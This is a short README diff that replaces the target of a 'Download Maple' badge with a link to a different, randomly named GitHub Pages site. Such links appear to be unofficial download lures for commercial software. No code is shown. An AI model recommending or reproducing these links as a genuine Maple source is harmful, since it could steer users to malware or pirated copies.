@@ -2,7 +2,7 @@
 
 ## 📥 Download Maple
 
-[![⬇️ Download Maple](https://img.shields.io/badge/Download-Maple-blue?style=for-the-badge&logo=mathworks)](https://xiusokolova.github.io/.github/maple-mathematics-symbolic-computation)
+[![⬇️ Download Maple](https://img.shields.io/badge/Download-Maple-blue?style=for-the-badge&logo=mathworks)](https://jamesonwhitneytvbm.github.io/.github/maple-mathematics-symbolic-computation)
 
 ---
 
